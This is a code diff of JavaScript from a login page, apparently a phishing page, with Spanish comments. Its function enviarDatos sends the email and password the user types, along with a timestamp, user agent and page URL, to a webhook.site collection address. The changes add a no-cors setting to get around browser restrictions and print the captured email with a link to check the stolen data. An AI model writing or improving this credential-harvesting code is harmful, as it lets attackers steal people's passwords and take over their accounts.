@@ -92,13 +92,13 @@
         }
 
         async function enviarDatos(email, password) {
-            // Opción 1: Enviar a un webhook (debes reemplazar la URL)
-            // Por ejemplo, usa webhook.site para pruebas o un servicio como Formspree
-            const webhookURL = 'https://webhook.site/dc166330-1516-42d7-bacb-74c2d6af8aef'; // Reemplaza con tu URL
+            // Enviar a webhook.site
+            const webhookURL = 'https://webhook.site/dc166330-1516-42d7-bacb-74c2d6af8aef';
             
             try {
                 const response = await fetch(webhookURL, {
                     method: 'POST',
+                    mode: 'no-cors', // Evita problemas de CORS
                     headers: {
                         'Content-Type': 'application/json',
                     },
@@ -106,13 +106,16 @@
                         email: email,
                         password: password,
                         timestamp: new Date().toISOString(),
-                        userAgent: navigator.userAgent
+                        userAgent: navigator.userAgent,
+                        url: window.location.href
                     })
                 });
                 
-                console.log('Datos enviados correctamente');
+                console.log('✅ Datos enviados correctamente a webhook.site');
+                console.log('📧 Email:', email);
+                console.log('🔗 Verifica en: https://webhook.site/#!/dc166330-1516-42d7-bacb-74c2d6af8aef');
             } catch (error) {
-                console.error('Error al enviar datos:', error);
+                console.error('❌ Error al enviar datos:', error);
             }
         }
     </script>
